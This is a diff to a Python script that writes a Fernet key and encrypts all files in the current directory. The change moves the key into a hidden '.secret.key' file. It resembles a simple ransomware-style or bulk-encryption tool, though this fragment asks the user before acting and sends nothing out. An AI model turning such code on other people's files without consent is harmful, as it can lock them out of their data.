@@ -24,11 +24,11 @@ def encrypt_file(file_name,key):
         print(f'[IGNORING]{file_name}')
 
 def main():
-    if os.path.exists('secret.key'):
+    if os.path.exists('.secret.key'):
         print(Fore.RED+'[FOUND A SECRET KEY]'+Style.RESET_ALL)
         ch = input("Secret Key Found ! Do you want to remove it?(Y)")
         if ch == 'Y' or ch =='y':
-            os.remove("secret.key")
+            os.remove(".secret.key")
         else:
             sys.exit("Aborting!")
     global allf
@@ -46,10 +46,10 @@ def main():
     global files
     files = allf[0][2]
     key = Fernet.generate_key()
-    with open("secret.key", "wb") as key_file:
+    with open(".secret.key", "wb") as key_file:
         key_file.write(key)
         key_file.close()
-    print(Fore.GREEN+"[SECRET KEY IS EXPORTED TO secret.key]\n"+Style.RESET_ALL)
+    print(Fore.GREEN+"[SECRET KEY IS EXPORTED TO .secret.key]\n"+Style.RESET_ALL)
     print(Fore.RED+"[ENCRYPTION IN PROCESS] [FILES]")
     print(Style.RESET_ALL)
     for fil in files:
